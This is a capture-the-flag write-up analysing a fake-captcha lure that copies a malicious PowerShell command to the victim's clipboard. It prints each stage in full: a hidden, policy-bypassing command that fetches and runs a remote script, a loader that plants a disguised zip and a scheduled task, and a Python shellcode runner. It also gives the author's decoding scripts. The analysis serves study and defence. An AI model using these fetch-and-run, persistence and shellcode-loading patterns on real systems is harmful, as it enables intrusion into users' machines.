# Prompt

![Verify You Are Human](/huntress_2025/Day_1/Verify_You_Are_Human/Challenge_VerifyYouAreHuman.png "Challenge Prompt")

# Solution

- This came out a while back from Huntress. Basically, it’s a malicious captcha that asks you to copy and paste the “captcha” into Powershell or some other cmd prompt.
- The first part of the challenge leads you to the malicious captcha. If you click on the verify, the checkbox turns red and takes you to a second captcha.

![Step 1 Captcha](/huntress_2025/Day_1/Verify_You_Are_Human/Step_1_Captcha.png)

![Step 2 Captcha](/huntress_2025/Day_1/Verify_You_Are_Human/Step_2_Captcha.png)

- If you look at the page source code, you should see the following:

```javascript
unsecuredCopyToClipboard(decodeURIComponent(escape(atob("IkM6XFdJTkRPV1Ncc3lzdGVtMzJcV2luZG93c1Bvd2VyU2hlbGxcdjEuMFxQb3dlclNoZWxsLmV4ZSIgLVdpIEhJIC1ub3AgLWMgIiRVa3ZxUkh0SXI9JGVudjpMb2NhbEFwcERhdGErJ1wnKyhHZXQtUmFuZG9tIC1NaW5pbXVtIDU0ODIgLU1heGltdW0gODYyNDUpKycuUFMxJztpcm0gJ2h0dHA6Ly8xMC4wLjIzLjIzOC8/dGljPTEnPiAkVWt2cVJIdElyO3Bvd2Vyc2hlbGwgLVdpIEhJIC1lcCBieXBhc3MgLWYgJFVrdnFSSHRJciI="))));
```

If you open the browser tools and go to the console, you can run the following to get the output.

```javascript
decodeURIComponent(escape(atob("IkM6XFdJTkRPV1Ncc3lzdGVtMzJcV2luZG93c1Bvd2VyU2hlbGxcdjEuMFxQb3dlclNoZWxsLmV4ZSIgLVdpIEhJIC1ub3AgLWMgIiRVa3ZxUkh0SXI9JGVudjpMb2NhbEFwcERhdGErJ1wnKyhHZXQtUmFuZG9tIC1NaW5pbXVtIDU0ODIgLU1heGltdW0gODYyNDUpKycuUFMxJztpcm0gJ2h0dHA6Ly8xMC4wLjIzLjIzOC8/dGljPTEnPiAkVWt2cVJIdElyO3Bvd2Vyc2hlbGwgLVdpIEhJIC1lcCBieXBhc3MgLWYgJFVrdnFSSHRJciI=")));
```

- You should get the following back 

```powershell
`"C:\\WINDOWS\\system32\\WindowsPowerShell\\v1.0\\PowerShell.exe" -Wi HI -nop -c "$UkvqRHtIr=$env:LocalAppData+'\\'+(Get-Random -Minimum 5482 -Maximum 86245)+'.PS1';irm 'http://Challenge_IP/?tic=1'> $UkvqRHtIr;powershell -Wi HI -ep bypass -f $UkvqRHtIr"`
```

- If you navigate to http://Challenge_IP/?tic=1, you should get 

```powershell
$JGFDGMKNGD = ([char]46)+([char]112)+([char]121)+([char]99);$HMGDSHGSHSHS = [guid]::NewGuid();$OIEOPTRJGS = $env:LocalAppData;irm 'http://Challenge_IP/?tic=2' -OutFile $OIEOPTRJGS\$HMGDSHGSHSHS.pdf;Add-Type -AssemblyName System.IO.Compression.FileSystem;[System.IO.Compression.ZipFile]::ExtractToDirectory("$OIEOPTRJGS\$HMGDSHGSHSHS.pdf", "$OIEOPTRJGS\$HMGDSHGSHSHS");$PIEVSDDGs = Join-Path $OIEOPTRJGS $HMGDSHGSHSHS;$WQRGSGSD = "$HMGDSHGSHSHS";$RSHSRHSRJSJSGSE = "$PIEVSDDGs\pythonw.exe";$RYGSDFSGSH = "$PIEVSDDGs\cpython-3134.pyc";$ENRYERTRYRNTER = New-ScheduledTaskAction -Execute $RSHSRHSRJSJSGSE -Argument "`"$RYGSDFSGSH`"";$TDRBRTRNREN = (Get-Date).AddSeconds(180);$YRBNETMREMY = New-ScheduledTaskTrigger -Once -At $TDRBRTRNREN;$KRYIYRTEMETN = New-ScheduledTaskPrincipal -UserId "$env:USERNAME" -LogonType Interactive -RunLevel Limited;Register-ScheduledTask -TaskName $WQRGSGSD -Action $ENRYERTRYRNTER -Trigger $YRBNETMREMY -Principal $KRYIYRTEMETN -Force;Set-Location $PIEVSDDGs;$WMVCNDYGDHJ = "cpython-3134" + $JGFDGMKNGD; Rename-Item -Path "cpython-3134" -NewName $WMVCNDYGDHJ; iex ('rundll32 shell32.dll,ShellExec_RunDLL "' + $PIEVSDDGs + '\pythonw" "' + $PIEVSDDGs + '\'+ $WMVCNDYGDHJ + '"');Remove-Item $MyInvocation.MyCommand.Path -Force;Set-Clipboard
```

- We can see a new URL, so let's head there: http://Challenge_IP/?tic=2. The page tries to execute some code. If you analyze the file it tries to download, it appears to be a PDF, but is actually a zip archive. If you read the code above, you can see that the code saves the file as a PDF, but it is actually a zip that the code decompresses.

```bash
wget http://10.0.23.238/?tic=2 -O tic2.zip
```

![Download the Zip](/huntress_2025/Day_1/Verify_You_Are_Human/Step_3_Zip_Download.png "Step 3")

- If you unzip the file and analyze the code above, it attempts to use the cpython file. I tried Uncompyle3 and Uncompyle6, but they did not work for this version of Python 3.13. I used [pycdc](https://github.com/zrax/pycdc) instead.

```bash
/home/kali/pycdc/pycdc cpython-3134.pyc
```

- This returns this code:

```python
import base64
base64.b64decode(None('aW1wb3J0IGN0eXBlcwoKZGVmIHhvcl9kZWNyeXB0KGNpcGhlcnRleHRfYnl0ZXMsIGtleV9ieXRlcyk6CiAgICBkZWNyeXB0ZWRfYnl0ZXMgPSBieXRlYXJyYXkoKQogICAga2V5X2xlbmd0aCA9IGxlbihrZXlfYnl0ZXMpCiAgICBmb3IgaSwgYnl0ZSBpbiBlbnVtZXJhdGUoY2lwaGVydGV4dF9ieXRlcyk6CiAgICAgICAgZGVjcnlwdGVkX2J5dGUgPSBieXRlIF4ga2V5X2J5dGVzW2kgJSBrZXlfbGVuZ3RoXQogICAgICAgIGRlY3J5cHRlZF9ieXRlcy5hcHBlbmQoZGVjcnlwdGVkX2J5dGUpCiAgICByZXR1cm4gYnl0ZXMoZGVjcnlwdGVkX2J5dGVzKQoKc2hlbGxjb2RlID0gYnl0ZWFycmF5KHhvcl9kZWNyeXB0KGJhc2U2NC5iNjRkZWNvZGUoJ3pHZGdUNkdIUjl1WEo2ODJrZGFtMUE1VGJ2SlAvQXA4N1Y2SnhJQ3pDOXlnZlgyU1VvSUwvVzVjRVAveGVrSlRqRytaR2dIZVZDM2NsZ3o5eDVYNW1nV0xHTmtnYStpaXhCeVRCa2thMHhicVlzMVRmT1Z6azJidURDakFlc2Rpc1U4ODdwOVVSa09MMHJEdmU2cWU3Z2p5YWI0SDI1ZFBqTytkVllrTnVHOHdXUT09JyksIGJhc2U2NC5iNjRkZWNvZGUoJ21lNkZ6azBIUjl1WFR6enVGVkxPUk0yVitacU1iQT09JykpKQpwdHIgPSBjdHlwZXMud2luZGxsLmtlcm5lbDMyLlZpcnR1YWxBbGxvYyhjdHlwZXMuY19pbnQoMCksIGN0eXBlcy5jX2ludChsZW4oc2hlbGxjb2RlKSksIGN0eXBlcy5jX2ludCgweDMwMDApLCBjdHlwZXMuY19pbnQoMHg0MCkpCmJ1ZiA9IChjdHlwZXMuY19jaGFyICogbGVuKHNoZWxsY29kZSkpLmZyb21fYnVmZmVyKHNoZWxsY29kZSkKY3R5cGVzLndpbmRsbC5rZXJuZWwzMi5SdGxNb3ZlTWVtb3J5KGN0eXBlcy5jX2ludChwdHIpLCBidWYsIGN0eXBlcy5jX2ludChsZW4oc2hlbGxjb2RlKSkpCmZ1bmN0eXBlID0gY3R5cGVzLkNGVU5DVFlQRShjdHlwZXMuY192b2lkX3ApCmZuID0gZnVuY3R5cGUocHRyKQpmbigp').decode('utf-8'))
```

- Decode the base64

```bash
echo "aW1wb3J0IGN0eXBlcwoKZGVmIHhvcl9kZWNyeXB0KGNpcGhlcnRleHRfYnl0ZXMsIGtleV9ieXRlcyk6CiAgICBkZWNyeXB0ZWRfYnl0ZXMgPSBieXRlYXJyYXkoKQogICAga2V5X2xlbmd0aCA9IGxlbihrZXlfYnl0ZXMpCiAgICBmb3IgaSwgYnl0ZSBpbiBlbnVtZXJhdGUoY2lwaGVydGV4dF9ieXRlcyk6CiAgICAgICAgZGVjcnlwdGVkX2J5dGUgPSBieXRlIF4ga2V5X2J5dGVzW2kgJSBrZXlfbGVuZ3RoXQogICAgICAgIGRlY3J5cHRlZF9ieXRlcy5hcHBlbmQoZGVjcnlwdGVkX2J5dGUpCiAgICByZXR1cm4gYnl0ZXMoZGVjcnlwdGVkX2J5dGVzKQoKc2hlbGxjb2RlID0gYnl0ZWFycmF5KHhvcl9kZWNyeXB0KGJhc2U2NC5iNjRkZWNvZGUoJ3pHZGdUNkdIUjl1WEo2ODJrZGFtMUE1VGJ2SlAvQXA4N1Y2SnhJQ3pDOXlnZlgyU1VvSUwvVzVjRVAveGVrSlRqRytaR2dIZVZDM2NsZ3o5eDVYNW1nV0xHTmtnYStpaXhCeVRCa2thMHhicVlzMVRmT1Z6azJidURDakFlc2Rpc1U4ODdwOVVSa09MMHJEdmU2cWU3Z2p5YWI0SDI1ZFBqTytkVllrTnVHOHdXUT09JyksIGJhc2U2NC5iNjRkZWNvZGUoJ21lNkZ6azBIUjl1WFR6enVGVkxPUk0yVitacU1iQT09JykpKQpwdHIgPSBjdHlwZXMud2luZGxsLmtlcm5lbDMyLlZpcnR1YWxBbGxvYyhjdHlwZXMuY19pbnQoMCksIGN0eXBlcy5jX2ludChsZW4oc2hlbGxjb2RlKSksIGN0eXBlcy5jX2ludCgweDMwMDApLCBjdHlwZXMuY19pbnQoMHg0MCkpCmJ1ZiA9IChjdHlwZXMuY19jaGFyICogbGVuKHNoZWxsY29kZSkpLmZyb21fYnVmZmVyKHNoZWxsY29kZSkKY3R5cGVzLndpbmRsbC5rZXJuZWwzMi5SdGxNb3ZlTWVtb3J5KGN0eXBlcy5jX2ludChwdHIpLCBidWYsIGN0eXBlcy5jX2ludChsZW4oc2hlbGxjb2RlKSkpCmZ1bmN0eXBlID0gY3R5cGVzLkNGVU5DVFlQRShjdHlwZXMuY192b2lkX3ApCmZuID0gZnVuY3R5cGUocHRyKQpmbigp" | base64 -d
```

- Based on this output (below), we can use the xor_decrypt function and solve the flag.

```python
import ctypes

def xor_decrypt(ciphertext_bytes, key_bytes):
    decrypted_bytes = bytearray()
    key_length = len(key_bytes)
    for i, byte in enumerate(ciphertext_bytes):
        decrypted_byte = byte ^ key_bytes[i % key_length]
        decrypted_bytes.append(decrypted_byte)
    return bytes(decrypted_bytes)

shellcode = bytearray(xor_decrypt(base64.b64decode('zGdgT6GHR9uXJ682kdam1A5TbvJP/Ap87V6JxICzC9ygfX2SUoIL/W5cEP/xekJTjG+ZGgHeVC3clgz9x5X5mgWLGNkga+iixByTBkka0xbqYs1TfOVzk2buDCjAesdisU887p9URkOL0rDve6qe7gjyab4H25dPjO+dVYkNuG8wWQ=='), base64.b64decode('me6Fzk0HR9uXTzzuFVLORM2V+ZqMbA==')))
ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0), ctypes.c_int(len(shellcode)), ctypes.c_int(0x3000), ctypes.c_int(0x40))
buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)
ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(ptr), buf, ctypes.c_int(len(shellcode)))
functype = ctypes.CFUNCTYPE(ctypes.c_void_p)
fn = functype(ptr)
fn()
```

- Use this python to decrypt the payload

```python
#!/usr/bin/env python3

import base64

def xor_decrypt(ciphertext_bytes, key_bytes):
    decrypted_bytes = bytearray()
    key_length = len(key_bytes)
    for i, byte in enumerate(ciphertext_bytes):
        decrypted_byte = byte ^ key_bytes[i % key_length]
        decrypted_bytes.append(decrypted_byte)
    return bytes(decrypted_bytes)

shellcode = bytearray(xor_decrypt(base64.b64decode('zGdgT6GHR9uXJ682kdam1A5TbvJP/Ap87V6JxICzC9ygfX2SUoIL/W5cEP/xekJTjG+ZGgHeVC3clgz9x5X5mgWLGNkga+iixByTBkka0xbqYs1TfOVzk2buDCjAesdisU887p9URkOL0rDve6qe7gjyab4H25dPjO+dVYkNuG8wWQ=='), base64.b64decode('me6Fzk0HR9uXTzzuFVLORM2V+ZqMbA==')))

print(shellcode)
```

- This returns the shellcode payload below:

```python
bytearray(b'U\x89\xe5\x81\xec\x80\x00\x00\x00h\x93\xd8\x84\x84h\x90\xc3\xc6\x97h\xc3\x90\x93\x92h\x90\xc4\xc3\xc7h\x9c\x93\x9c\x93h\xc0\x9c\xc6\xc6h\x97\xc6\x9c\x93h\x94\xc7\x9d\xc1h\xde\xc1\x96\x91h\xc3\xc9\xc4\xc2\xb9\n\x00\x00\x00\x89\xe7\x817\xa5\xa5\xa5\xa5\x83\xc7\x04Iu\xf4\xc6D$&\x00\xc6\x85\x7f\xff\xff\xff\x00\x89\xe6\x8d}\x80\xb9&\x00\x00\x00\x8a\x06\x88\x07FGIu\xf7\xc6\x07\x00\x8d<$\xb9@\x00\x00\x00\xb0\x01\x88\x07GIu\xfa\xc9\xc3')
```

- We can use python to decode this shellcode and get the flag:

```python
import binascii, textwrap

shell = b'U\x89\xe5\x81\xec\x80\x00\x00\x00h\x93\xd8\x84\x84h\x90\xc3\xc6\x97h\xc3\x90\x93\x92h\x90\xc4\xc3\xc7h\x9c\x93\x9c\x93h\xc0\x9c\xc6\xc6h\x97\xc6\x9c\x93h\x94\xc7\x9d\xc1h\xde\xc1\x96\x91h\xc3\xc9\xc4\xc2\xb9\n\x00\x00\x00\x89\xe7\x817\xa5\xa5\xa5\xa5\x83\xc7\x04Iu\xf4\xc6D$&\x00\xc6\x85\x7f\xff\xff\xff\x00\x89\xe6\x8d}\x80\xb9&\x00\x00\x00\x8a\x06\x88\x07FGIu\xf7\xc6\x07\x00\x8d<$\xb9@\x00\x00\x00\xb0\x01\x88\x07GIu\xfa\xc9\xc3'

# find push imm dwords (0x68)
dwords = []
i = 0
while i < len(shell)-4:
    if shell[i] == 0x68:  # push imm32
        d = shell[i+1:i+5]
        dwords.append(d)
        i += 5
    else:
        i += 1

print("Found", len(dwords), "push imm dwords. Hex:")
for j,d in enumerate(dwords):
    print(f"{j:02d} {binascii.hexlify(d).decode()}")

raw = b''.join(dwords)
print("\nRaw concatenated (hex):", binascii.hexlify(raw).decode())

key = 0xA5
decoded = bytes([b ^ key for b in raw])
print("\nDecoded (hex):", binascii.hexlify(decoded).decode())

def ascii_runs(b, min_len=4):
    runs = []
    cur = bytearray()
    for x in b:
        if 32 <= x <= 126:
            cur.append(x)
        else:
            if len(cur) >= min_len:
                runs.append(cur.decode('ascii'))
            cur = bytearray()
    if len(cur) >= min_len:
        runs.append(cur.decode('ascii'))
    return runs

print("\nASCII runs in decoded bytes:", ascii_runs(decoded, 4))

rev = b''.join(dwords[::-1])
decoded_rev = bytes([b ^ key for b in rev])
print("\nDecoded reversed ASCII runs:", ascii_runs(decoded_rev, 4))
print("\nDecoded reversed bytes (as ascii where printable):")
print(''.join(chr(b) if 32<=b<=126 else '.' for b in decoded_rev))
```

![Decode Shellcode](/huntress_2025/Day_1/Verify_You_Are_Human/Step_4_Decode_Shellcode.png "Decode Shellcode")

# Flag

- flag{d341b8d2c96e9cc96965afbf5675fc26}